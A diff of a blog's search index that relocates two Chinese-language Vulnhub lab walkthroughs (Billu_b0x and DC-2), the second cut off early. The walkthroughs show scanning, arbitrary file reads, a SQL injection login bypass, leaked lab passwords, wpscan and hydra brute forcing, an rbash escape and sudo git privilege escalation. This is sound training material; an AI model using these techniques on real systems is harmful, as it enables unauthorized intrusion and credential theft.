@@ -32,203 +32,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Billu_b0x</title>
-    <url>/posts/827ecdf7/</url>
-    <content><![CDATA[<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><blockquote>
-<p>网段        192.168.18.0/24</p>
-<p>kali        192.168.18.131</p>
-<p>靶机        192.168.18.144</p>
-</blockquote>
-<h4 id="nmap扫网段"><a href="#nmap扫网段" class="headerlink" title="nmap扫网段"></a>nmap扫网段</h4><p><code>sudo nmap 192.168.18.0/24 -sP</code></p>
-<blockquote>
-<p>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-11 19:58 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.000079s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.144<br>Host is up (0.00054s latency).<br>MAC Address: 00:0C:29:77:56:7F (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00017s latency).<br>MAC Address: 00:50:56:FD:0E:3D (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 2.25 seconds</p>
-</blockquote>
-<h4 id="nmap扫端口"><a href="#nmap扫端口" class="headerlink" title="nmap扫端口"></a>nmap扫端口</h4><p><code>sudo nmap 192.168.18.144 -p- -sV</code></p>
-<blockquote>
-<p>kali@kali2020:~$ sudo nmap 192.168.18.144 -p- -sV<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-11 20:00 CST<br>Nmap scan report for 192.168.18.144<br>Host is up (0.0012s latency).<br>Not shown: 65533 closed ports<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)<br>80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))<br>MAC Address: 00:0C:29:77:56:7F (VMware)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
-<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 7.91 seconds</p>
-</blockquote>
-<p>开放了22端口和80端口</p>
-<h4 id="dirsearch扫描目录"><a href="#dirsearch扫描目录" class="headerlink" title="dirsearch扫描目录"></a>dirsearch扫描目录</h4><p><code>sudo python3 dirsearch.py -u 192.168.18.144</code></p>
-<blockquote>
-<p>[20:25:23] 200 -  307B  - /add<br>[20:25:23] 200 -  307B  - /add.php<br>[20:25:25] 200 -    1B  - /c<br>[20:25:25] 403 -  290B  - /cgi-bin/<br>[20:25:27] 403 -  286B  - /doc/<br>[20:25:27] 403 -  301B  - /doc/en/changes.html<br>[20:25:27] 403 -  290B  - /doc/api/<br>[20:25:27] 403 -  300B  - /doc/stable.version<br>[20:25:27] 200 -    3KB - /head.php<br>[20:25:28] 200 -    1KB - /images/<br>[20:25:28] 301 -  317B  - /images  -&gt;  <a href="http://192.168.18.144/images/">http://192.168.18.144/images/</a><br>[20:25:28] 200 -   47KB - /in<br>[20:25:28] 200 -    3KB - /index<br>[20:25:28] 200 -    3KB - /index.php </p>
-<p>[20:25:29] 302 -    2KB - /panel  -&gt;  index.php<br>[20:25:29] 302 -    2KB - /panel.php  -&gt;  index.php<br>[20:25:30] 200 -    8KB - /phpmy/<br>[20:25:31] 403 -  296B  - /server-status/<br>[20:25:31] 403 -  295B  - /server-status<br>[20:25:31] 200 -    1B  - /show<br>[20:25:32] 200 -   72B  - /test<br>[20:25:32] 200 -   72B  - /test.php    </p>
-</blockquote>
-<p>扫出</p>
-<p><code>add.php</code>     文件上传</p>
-<p><img src="/posts/827ecdf7/add.png"></p>
-<p><code>head.php</code> 貌似没啥东西 就一背景图</p>
-<p><img src="/posts/827ecdf7/head.png"></p>
-<p><code>test.php</code> 文件包含</p>
-<p><img src="/posts/827ecdf7/test.png"></p>
-<p><code>phpmy</code>        phpmyadmin登录页面</p>
-<p><img src="/posts/827ecdf7/phpmy.png"></p>
-<p><code>in</code>            phpinfo()</p>
-<p><img src="/posts/827ecdf7/phpinfo.png"></p>
-<blockquote>
-<p>allow_url_fopen    On<br>allow_url_include    Off<br>mysql版本为5.5.38</p>
-</blockquote>
-<h4 id="用dirb扫描目录"><a href="#用dirb扫描目录" class="headerlink" title="用dirb扫描目录"></a>用dirb扫描目录</h4><blockquote>
-<p> —- Scanning URL: <a href="http://192.168.18.144/">http://192.168.18.144/</a> —-</p>
-<ul>
-<li><a href="http://192.168.18.144/add">http://192.168.18.144/add</a> (CODE:200|SIZE:307)                                                          </li>
-<li><a href="http://192.168.18.144/c">http://192.168.18.144/c</a> (CODE:200|SIZE:1)                                                              </li>
-<li><a href="http://192.168.18.144/cgi-bin/">http://192.168.18.144/cgi-bin/</a> (CODE:403|SIZE:290)                                                     </li>
-<li><a href="http://192.168.18.144/head">http://192.168.18.144/head</a> (CODE:200|SIZE:2793)<br>==&gt; DIRECTORY: <a href="http://192.168.18.144/images/">http://192.168.18.144/images/</a>                                                             </li>
-<li><a href="http://192.168.18.144/in">http://192.168.18.144/in</a> (CODE:200|SIZE:47554)                                                         </li>
-<li><a href="http://192.168.18.144/index">http://192.168.18.144/index</a> (CODE:200|SIZE:3267)                                                       </li>
-<li><a href="http://192.168.18.144/index.php">http://192.168.18.144/index.php</a> (CODE:200|SIZE:3267)                                                   </li>
-<li><a href="http://192.168.18.144/panel">http://192.168.18.144/panel</a> (CODE:302|SIZE:2469)                                                       </li>
-<li><a href="http://192.168.18.144/server-status">http://192.168.18.144/server-status</a> (CODE:403|SIZE:295)                                                </li>
-<li><a href="http://192.168.18.144/show">http://192.168.18.144/show</a> (CODE:200|SIZE:1)                                                           </li>
-<li><a href="http://192.168.18.144/test">http://192.168.18.144/test</a> (CODE:200|SIZE:72)                                                          </li>
-</ul>
-</blockquote>
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h4><p>进入主页，有一个登录框，并提示sql注入</p>
-<p><img src="/posts/827ecdf7/index.png"></p>
-<p>尝试下sql注入，用sqlmap跑一下</p>
-<p><code>sqlmap -u &#39;http://192.168.18.144/&#39;  --method POST --data &#39;un=admin&amp;os=admin&amp;login=let%27s+login&#39; --batch --dbms mysql </code></p>
-<p>没扫出来注入点</p>
-<br>
-
-<h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><p>传一个图片马试试，或许后面会用到</p>
-<br>
-
-<h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h4><p>在<code>test.php</code>get请求 传参 <code>?file=/etc/passwd</code>没反应</p>
-<p>使用post传参<code>file=/etc/passwd</code>会弹出一个下载文件窗口</p>
-<p>文件内容为<code>/etc/passwd</code>的输出内容</p>
-<p>使用burp抓包，把get包改为post包</p>
-<p><img src="/posts/827ecdf7/file_include1.png"></p>
-<blockquote>
-<p>ica:x:1000:1000:ica,,,:/home/ica:/bin/bash</p>
-</blockquote>
-<p>发现一个<code>ica</code>的用户，可以登录ssh</p>
-<br>
-
-
-<p>同时用这种方法去下载<code>add.php</code>,<code>in.php</code> <code>index.php</code> <code>test.php</code> <code>show.php</code> <code>c.php</code></p>
-<p><img src="/posts/827ecdf7/addphp.png"><br>在add.php中有文件上传的代码，没有经过任何处理，可以考虑去上传图片马在in.php中是phpinfo信息</p>
-<h4 id="后台登录"><a href="#后台登录" class="headerlink" title="后台登录"></a>后台登录</h4><h5 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h5><p><img src="/posts/827ecdf7/cphp.png"><br>在c.php中发现了mysql数据库的账户信息<code>$conn = mysqli_connect(&quot;127.0.0.1&quot;,&quot;billu&quot;,&quot;b0x_billu&quot;,&quot;ica_lab&quot;);</code></p>
-<blockquote>
-<p>用户名 billu密码 b0x_billu数据库名 ica_lab</p>
-</blockquote>
-<p>使用这个账户去尝试登录phpmyadmin，成功登录,并得到phpmyadmin版本为3.4.7登录后台思路一 使用phpmyadmin中账号<br><img src="/posts/827ecdf7/auth.png"><br>在anth表中得到一个账户 biLLu hEx_it使用此账户成功登录到后台</p>
-<h5 id="思路二-SQL注入再尝试查看index-php的源码"><a href="#思路二-SQL注入再尝试查看index-php的源码" class="headerlink" title="思路二 SQL注入再尝试查看index.php的源码"></a>思路二 SQL注入再尝试查看index.php的源码</h5><p><img src="/posts/827ecdf7/sqli.png"><br><code>select * from auth where pass=\&#39;&#39;.$pass=.&#39;\&#39; and uname=\&#39;&#39;.$uname.&#39;\&#39;</code><br>前面使用str_replace 将单引号全部过滤掉了，<br><code>select   from auth where pass=&#39; &#39; and uname=&#39; &#39;</code><br>输入<code>pass=admin\   uname= or 1=1 --+</code><br>即 <code>select  from auth where pass=&#39;admin\&#39; and uname=&#39; or 1=1 --+&#39;</code><br>成功登录文件上传<br><img src="/posts/827ecdf7/login.png"><br>审计一下panel.php<br>页面有两个功能 show users 和 add users 对于文件上传使用了白名单机制，只允许上传<code>jpeg,jpg,gif,png</code><br>当要上传一张图片是，会先判断后缀名是否正确，如果正确，还有一个mime验证<br><code>move_uploaded_file($_FILES[&#39;image&#39;][&#39;tmp_name&#39;], &#39;uploaded_images/&#39;.$_FILES[&#39;image&#39;][&#39;name&#39;])</code>可以看到上传图片的路径为uploaded_images/</p>
-<p>这里传马多次都没传成功，有时间再试试吧….</p>
-<h4 id="得到root权限思路二"><a href="#得到root权限思路二" class="headerlink" title="得到root权限思路二"></a>得到root权限思路二</h4><p>phpmyadmin的配置文件为<code>config.inc.php</code> 使用任意文件下载去下载改配置文件<br><img src="/posts/827ecdf7/download_phpmyconf.png"><br><img src="/posts/827ecdf7/phpmyconf.png"><br>得到一个root账户root roottoor使用ssh登录 ssh <a href="mailto:&#x72;&#111;&#x6f;&#116;&#x40;&#49;&#x39;&#x32;&#x2e;&#49;&#54;&#56;&#46;&#49;&#x38;&#x2e;&#x31;&#x34;&#52;">&#x72;&#111;&#x6f;&#116;&#x40;&#49;&#x39;&#x32;&#x2e;&#49;&#54;&#56;&#46;&#49;&#x38;&#x2e;&#x31;&#x34;&#52;</a>成功登录root用户</p>
-<p>Reference</p>
-<blockquote>
-<p><a href="https://blog.csdn.net/weixin_52049485/article/details/112248860">https://blog.csdn.net/weixin_52049485/article/details/112248860</a><br><a href="https://www.cnblogs.com/PANDA-Mosen/p/13217674.html">https://www.cnblogs.com/PANDA-Mosen/p/13217674.html</a><br><a href="https://mengsec.com/2018/04/11/Vulnhub-billub0x-Writeup/">https://mengsec.com/2018/04/11/Vulnhub-billub0x-Writeup/</a></p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>vulhub</category>
-      </categories>
-      <tags>
-        <tag>vulhub</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>DCchallenges2</title>
-    <url>/posts/e4e28081/</url>
-    <content><![CDATA[<p>靶机DC-2下载地址：<a href="https://download.vulnhub.com/dc/DC-2.zip">https://download.vulnhub.com/dc/DC-2.zip</a></p>
-<br>
-
-<p>环境</p>
-<blockquote>
-<p>网段 192.168.18.0/24</p>
-<p>kali 192.168.18.131</p>
-<p>靶机 192.168.18.132</p>
-</blockquote>
-<p>扫描网段</p>
-<blockquote>
-<p>sudo nmap -sn 192.168.18.0/24</p>
-<p>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-04-30 10:12 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00013s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.132<br>Host is up (0.00055s latency).<br>MAC Address: 00:0C:29:4B:26:E6 (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00017s latency).<br>MAC Address: 00:50:56:E1:37:77 (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 2.24 seconds<br>kali@kali2020:~$ </p>
-</blockquote>
-<p>扫描靶机开放的端口</p>
-<blockquote>
-<p>sudo nmap 192.168.18.132 -p- -sV<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-04-30 11:38 CST<br>Nmap scan report for dc-2 (192.168.18.132)<br>Host is up (0.0013s latency).<br>Not shown: 65533 closed ports<br>PORT     STATE SERVICE VERSION<br>80/tcp   open  http    Apache httpd 2.4.10 ((Debian))<br>7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)<br>MAC Address: 00:0C:29:4B:26:E6 (VMware)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
-</blockquote>
-<p>开放了80端口和ssh端口，浏览器去访问发现无法访问，直接跳转成了dc2，去修改hosts</p>
-<blockquote>
-<p>sudo vim /etc/hosts</p>
-<p>添加 192.168.18.132 dc-2</p>
-</blockquote>
-<p>再去访问192.168.18.132即可,发现是wordpress</p>
-<h4 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h4><p>点击flag 得到flag1，提示使用<code>cewl</code></p>
-<p><img src="/posts/e4e28081/flag1.png"></p>
-<p>用<code>dirb</code>扫一下目录</p>
-<p>扫到一个wp-admin 去访问后会跳转到登录页面 <a href="http://dc-2/wp-login.php">http://dc-2/wp-login.php</a></p>
-<p>这里也可以用<code>nikto</code></p>
-<p><img src="/posts/e4e28081/nikto1.png"></p>
-<h4 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h4><p>使用kali自带的wpscan扫一下<br><code>wpscan --url dc-2 -e u</code></p>
-<p><img src="/posts/e4e28081/wpscan1.png"></p>
-<br>
-
-<p>扫到三个用户名，admin,jerry,tom<br>创建一个list存放这三个用户名</p>
-<br>
-
-<p>根据flag1的提示 使用<code>cewl</code>生成密码字典</p>
-<br>
-
-<blockquote>
-<p>kali@kali2020:~/Desktop$ cewl dc-2 -w dc-2.dic<br>CeWL 5.4.8 (Inclusion) Robin Wood (<a href="mailto:&#x72;&#111;&#x62;&#105;&#110;&#64;&#x64;&#x69;&#x67;&#x69;&#x2e;&#x6e;&#105;&#x6e;&#106;&#x61;">&#x72;&#111;&#x62;&#105;&#110;&#64;&#x64;&#x69;&#x67;&#x69;&#x2e;&#x6e;&#105;&#x6e;&#106;&#x61;</a>) (<a href="https://digi.ninja/">https://digi.ninja/</a>)</p>
-<p>kali@kali2020:~/Desktop$ cat dc-2.dic </p>
-</blockquote>
-<p>使用wpscan爆破</p>
-<blockquote>
-<p>kali@kali2020:~/Desktop$ wpscan –url dc-2 -U dc-2users.list  -P dc-2.dic </p>
-<p>[!] Valid Combinations Found:<br> | Username: jerry, Password: adipiscing<br> | Username: tom, Password: parturient</p>
-</blockquote>
-<p><img src="/posts/e4e28081/wpscan2.png"></p>
-<p>使用tom 成功登录，发现有篇名为hello-word的文章进去看看</p>
-<p>有一个搜索功能，尝试一下，发现输入1会出现flag1,输入2出现flag2<br><img src="/posts/e4e28081/flag2.png"><br><img src="/posts/e4e28081/flag12.png"><br>flag2提示换一条路，也是就说让我们去尝试ssh端口</p>
-<p>使用hydra爆破ssh</p>
-<blockquote>
-<p>kali@kali2020:~/Desktop$ hydra -L dc-2users.list  -P dc-2.dic  192.168.18.132 ssh -s 7744</p>
-<p> 得到账号密码</p>
-<p>[7744][ssh] host: 192.168.18.132   login: tom   password: parturient</p>
-</blockquote>
-<h4 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h4><p>使用ssh登录<br><code>kali@kali2020:~/Desktop$ ssh tom@192.168.18.132 -p 7744</code><br>登录后<code>ls</code>后发现存在flag3.txt</p>
-<p>使用<code>cat flag3.txt</code></p>
-<blockquote>
-<p>-rbash: sudo: command not found</p>
-</blockquote>
-<p><img src="/posts/e4e28081/rbashnotfound.png"></p>
-<p><strong>-rbash绕过</strong><br>解决方案 <a href="https://www.cnblogs.com/xiaoxiaoleo/p/8450379.html">https://www.cnblogs.com/xiaoxiaoleo/p/8450379.html</a></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BASH_CMDS[a]&#x3D;&#x2F;bin&#x2F;sh;a </span><br><span class="line">export PATH&#x3D;$PATH:&#x2F;bin&#x2F;</span><br><span class="line">export PATH&#x3D;$PATH:&#x2F;usr&#x2F;bin</span><br></pre></td></tr></table></figure>
-<p><img src="/posts/e4e28081/flag3.png"></p>
-<p>得到flag3</p>
-<h4 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h4><p>根据flag3提示，使用<code>su</code>切换到jerry用户下<br><code>cat /etc/passwd </code>发现Jerry用户<br>输入之前爆破出来的密码成功登录Jerry用户</p>
-<blockquote>
-<p>cd ~<br>ls<br>cat flag4.txt<br>Good to see that you’ve made it this far - but you’re not home yet.<br>You still need to get the final flag (the only flag that really counts!!!).<br>No hints here - you’re on your own now.  :-)<br>Go on - git outta here!!!!<br><br><br><br></p>
-</blockquote>
-<h4 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h4><p>查看sudo 支持的免密命令</p>
-<blockquote>
-<p>sudo -l</p>
-<p>Matching Defaults entries for jerry on DC-2:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</p>
-<p>User jerry may run the following commands on DC-2:<br>    (root) NOPASSWD: /usr/bin/git</p>
-</blockquote>
-<p>根据上一个提示 这里的git命令推测可以使用</p>
-<p>考虑git提权 <a href="https://gtfobins.github.io/gtfobins/git/">https://gtfobins.github.io/gtfobins/git/</a></p>
-<blockquote>
-<p>sudo git -p –help</p>
-</blockquote>
-<p><img src="/posts/e4e28081/git1.png"><br><img src="/posts/e4e28081/git2.png"><br><img src="/posts/e4e28081/git3.png"><br><img src="/posts/e4e28081/finalflag.png"></p>
-<p><strong>总结</strong></p>
-<ul>
-<li> rbash绕过</li>
-<li> git提权</li>
-</ul>
-]]></content>
-      <categories>
-        <category>DCchallenges</category>
-      </categories>
-      <tags>
-        <tag>DCchallenges</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>DCchallenges1</title>
     <url>/posts/7debd13b/</url>
     <content><![CDATA[<p>安装</p>
@@ -351,6 +154,203 @@
       </tags>
   </entry>
   <entry>
+    <title>Billu_b0x</title>
+    <url>/posts/827ecdf7/</url>
+    <content><![CDATA[<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><blockquote>
+<p>网段        192.168.18.0/24</p>
+<p>kali        192.168.18.131</p>
+<p>靶机        192.168.18.144</p>
+</blockquote>
+<h4 id="nmap扫网段"><a href="#nmap扫网段" class="headerlink" title="nmap扫网段"></a>nmap扫网段</h4><p><code>sudo nmap 192.168.18.0/24 -sP</code></p>
+<blockquote>
+<p>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-11 19:58 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.000079s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.144<br>Host is up (0.00054s latency).<br>MAC Address: 00:0C:29:77:56:7F (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00017s latency).<br>MAC Address: 00:50:56:FD:0E:3D (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 2.25 seconds</p>
+</blockquote>
+<h4 id="nmap扫端口"><a href="#nmap扫端口" class="headerlink" title="nmap扫端口"></a>nmap扫端口</h4><p><code>sudo nmap 192.168.18.144 -p- -sV</code></p>
+<blockquote>
+<p>kali@kali2020:~$ sudo nmap 192.168.18.144 -p- -sV<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-11 20:00 CST<br>Nmap scan report for 192.168.18.144<br>Host is up (0.0012s latency).<br>Not shown: 65533 closed ports<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)<br>80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))<br>MAC Address: 00:0C:29:77:56:7F (VMware)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
+<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 7.91 seconds</p>
+</blockquote>
+<p>开放了22端口和80端口</p>
+<h4 id="dirsearch扫描目录"><a href="#dirsearch扫描目录" class="headerlink" title="dirsearch扫描目录"></a>dirsearch扫描目录</h4><p><code>sudo python3 dirsearch.py -u 192.168.18.144</code></p>
+<blockquote>
+<p>[20:25:23] 200 -  307B  - /add<br>[20:25:23] 200 -  307B  - /add.php<br>[20:25:25] 200 -    1B  - /c<br>[20:25:25] 403 -  290B  - /cgi-bin/<br>[20:25:27] 403 -  286B  - /doc/<br>[20:25:27] 403 -  301B  - /doc/en/changes.html<br>[20:25:27] 403 -  290B  - /doc/api/<br>[20:25:27] 403 -  300B  - /doc/stable.version<br>[20:25:27] 200 -    3KB - /head.php<br>[20:25:28] 200 -    1KB - /images/<br>[20:25:28] 301 -  317B  - /images  -&gt;  <a href="http://192.168.18.144/images/">http://192.168.18.144/images/</a><br>[20:25:28] 200 -   47KB - /in<br>[20:25:28] 200 -    3KB - /index<br>[20:25:28] 200 -    3KB - /index.php </p>
+<p>[20:25:29] 302 -    2KB - /panel  -&gt;  index.php<br>[20:25:29] 302 -    2KB - /panel.php  -&gt;  index.php<br>[20:25:30] 200 -    8KB - /phpmy/<br>[20:25:31] 403 -  296B  - /server-status/<br>[20:25:31] 403 -  295B  - /server-status<br>[20:25:31] 200 -    1B  - /show<br>[20:25:32] 200 -   72B  - /test<br>[20:25:32] 200 -   72B  - /test.php    </p>
+</blockquote>
+<p>扫出</p>
+<p><code>add.php</code>     文件上传</p>
+<p><img src="/posts/827ecdf7/add.png"></p>
+<p><code>head.php</code> 貌似没啥东西 就一背景图</p>
+<p><img src="/posts/827ecdf7/head.png"></p>
+<p><code>test.php</code> 文件包含</p>
+<p><img src="/posts/827ecdf7/test.png"></p>
+<p><code>phpmy</code>        phpmyadmin登录页面</p>
+<p><img src="/posts/827ecdf7/phpmy.png"></p>
+<p><code>in</code>            phpinfo()</p>
+<p><img src="/posts/827ecdf7/phpinfo.png"></p>
+<blockquote>
+<p>allow_url_fopen    On<br>allow_url_include    Off<br>mysql版本为5.5.38</p>
+</blockquote>
+<h4 id="用dirb扫描目录"><a href="#用dirb扫描目录" class="headerlink" title="用dirb扫描目录"></a>用dirb扫描目录</h4><blockquote>
+<p> —- Scanning URL: <a href="http://192.168.18.144/">http://192.168.18.144/</a> —-</p>
+<ul>
+<li><a href="http://192.168.18.144/add">http://192.168.18.144/add</a> (CODE:200|SIZE:307)                                                          </li>
+<li><a href="http://192.168.18.144/c">http://192.168.18.144/c</a> (CODE:200|SIZE:1)                                                              </li>
+<li><a href="http://192.168.18.144/cgi-bin/">http://192.168.18.144/cgi-bin/</a> (CODE:403|SIZE:290)                                                     </li>
+<li><a href="http://192.168.18.144/head">http://192.168.18.144/head</a> (CODE:200|SIZE:2793)<br>==&gt; DIRECTORY: <a href="http://192.168.18.144/images/">http://192.168.18.144/images/</a>                                                             </li>
+<li><a href="http://192.168.18.144/in">http://192.168.18.144/in</a> (CODE:200|SIZE:47554)                                                         </li>
+<li><a href="http://192.168.18.144/index">http://192.168.18.144/index</a> (CODE:200|SIZE:3267)                                                       </li>
+<li><a href="http://192.168.18.144/index.php">http://192.168.18.144/index.php</a> (CODE:200|SIZE:3267)                                                   </li>
+<li><a href="http://192.168.18.144/panel">http://192.168.18.144/panel</a> (CODE:302|SIZE:2469)                                                       </li>
+<li><a href="http://192.168.18.144/server-status">http://192.168.18.144/server-status</a> (CODE:403|SIZE:295)                                                </li>
+<li><a href="http://192.168.18.144/show">http://192.168.18.144/show</a> (CODE:200|SIZE:1)                                                           </li>
+<li><a href="http://192.168.18.144/test">http://192.168.18.144/test</a> (CODE:200|SIZE:72)                                                          </li>
+</ul>
+</blockquote>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h4><p>进入主页，有一个登录框，并提示sql注入</p>
+<p><img src="/posts/827ecdf7/index.png"></p>
+<p>尝试下sql注入，用sqlmap跑一下</p>
+<p><code>sqlmap -u &#39;http://192.168.18.144/&#39;  --method POST --data &#39;un=admin&amp;os=admin&amp;login=let%27s+login&#39; --batch --dbms mysql </code></p>
+<p>没扫出来注入点</p>
+<br>
+
+<h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><p>传一个图片马试试，或许后面会用到</p>
+<br>
+
+<h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h4><p>在<code>test.php</code>get请求 传参 <code>?file=/etc/passwd</code>没反应</p>
+<p>使用post传参<code>file=/etc/passwd</code>会弹出一个下载文件窗口</p>
+<p>文件内容为<code>/etc/passwd</code>的输出内容</p>
+<p>使用burp抓包，把get包改为post包</p>
+<p><img src="/posts/827ecdf7/file_include1.png"></p>
+<blockquote>
+<p>ica:x:1000:1000:ica,,,:/home/ica:/bin/bash</p>
+</blockquote>
+<p>发现一个<code>ica</code>的用户，可以登录ssh</p>
+<br>
+
+
+<p>同时用这种方法去下载<code>add.php</code>,<code>in.php</code> <code>index.php</code> <code>test.php</code> <code>show.php</code> <code>c.php</code></p>
+<p><img src="/posts/827ecdf7/addphp.png"><br>在add.php中有文件上传的代码，没有经过任何处理，可以考虑去上传图片马在in.php中是phpinfo信息</p>
+<h4 id="后台登录"><a href="#后台登录" class="headerlink" title="后台登录"></a>后台登录</h4><h5 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h5><p><img src="/posts/827ecdf7/cphp.png"><br>在c.php中发现了mysql数据库的账户信息<code>$conn = mysqli_connect(&quot;127.0.0.1&quot;,&quot;billu&quot;,&quot;b0x_billu&quot;,&quot;ica_lab&quot;);</code></p>
+<blockquote>
+<p>用户名 billu密码 b0x_billu数据库名 ica_lab</p>
+</blockquote>
+<p>使用这个账户去尝试登录phpmyadmin，成功登录,并得到phpmyadmin版本为3.4.7登录后台思路一 使用phpmyadmin中账号<br><img src="/posts/827ecdf7/auth.png"><br>在anth表中得到一个账户 biLLu hEx_it使用此账户成功登录到后台</p>
+<h5 id="思路二-SQL注入再尝试查看index-php的源码"><a href="#思路二-SQL注入再尝试查看index-php的源码" class="headerlink" title="思路二 SQL注入再尝试查看index.php的源码"></a>思路二 SQL注入再尝试查看index.php的源码</h5><p><img src="/posts/827ecdf7/sqli.png"><br><code>select * from auth where pass=\&#39;&#39;.$pass=.&#39;\&#39; and uname=\&#39;&#39;.$uname.&#39;\&#39;</code><br>前面使用str_replace 将单引号全部过滤掉了，<br><code>select   from auth where pass=&#39; &#39; and uname=&#39; &#39;</code><br>输入<code>pass=admin\   uname= or 1=1 --+</code><br>即 <code>select  from auth where pass=&#39;admin\&#39; and uname=&#39; or 1=1 --+&#39;</code><br>成功登录文件上传<br><img src="/posts/827ecdf7/login.png"><br>审计一下panel.php<br>页面有两个功能 show users 和 add users 对于文件上传使用了白名单机制，只允许上传<code>jpeg,jpg,gif,png</code><br>当要上传一张图片是，会先判断后缀名是否正确，如果正确，还有一个mime验证<br><code>move_uploaded_file($_FILES[&#39;image&#39;][&#39;tmp_name&#39;], &#39;uploaded_images/&#39;.$_FILES[&#39;image&#39;][&#39;name&#39;])</code>可以看到上传图片的路径为uploaded_images/</p>
+<p>这里传马多次都没传成功，有时间再试试吧….</p>
+<h4 id="得到root权限思路二"><a href="#得到root权限思路二" class="headerlink" title="得到root权限思路二"></a>得到root权限思路二</h4><p>phpmyadmin的配置文件为<code>config.inc.php</code> 使用任意文件下载去下载改配置文件<br><img src="/posts/827ecdf7/download_phpmyconf.png"><br><img src="/posts/827ecdf7/phpmyconf.png"><br>得到一个root账户root roottoor使用ssh登录 ssh <a href="mailto:&#x72;&#x6f;&#111;&#116;&#64;&#x31;&#x39;&#50;&#x2e;&#49;&#54;&#56;&#x2e;&#49;&#x38;&#x2e;&#x31;&#52;&#x34;">&#x72;&#x6f;&#111;&#116;&#64;&#x31;&#x39;&#50;&#x2e;&#49;&#54;&#56;&#x2e;&#49;&#x38;&#x2e;&#x31;&#52;&#x34;</a>成功登录root用户</p>
+<p>Reference</p>
+<blockquote>
+<p><a href="https://blog.csdn.net/weixin_52049485/article/details/112248860">https://blog.csdn.net/weixin_52049485/article/details/112248860</a><br><a href="https://www.cnblogs.com/PANDA-Mosen/p/13217674.html">https://www.cnblogs.com/PANDA-Mosen/p/13217674.html</a><br><a href="https://mengsec.com/2018/04/11/Vulnhub-billub0x-Writeup/">https://mengsec.com/2018/04/11/Vulnhub-billub0x-Writeup/</a></p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>vulhub</category>
+      </categories>
+      <tags>
+        <tag>vulhub</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DCchallenges2</title>
+    <url>/posts/e4e28081/</url>
+    <content><![CDATA[<p>靶机DC-2下载地址：<a href="https://download.vulnhub.com/dc/DC-2.zip">https://download.vulnhub.com/dc/DC-2.zip</a></p>
+<br>
+
+<p>环境</p>
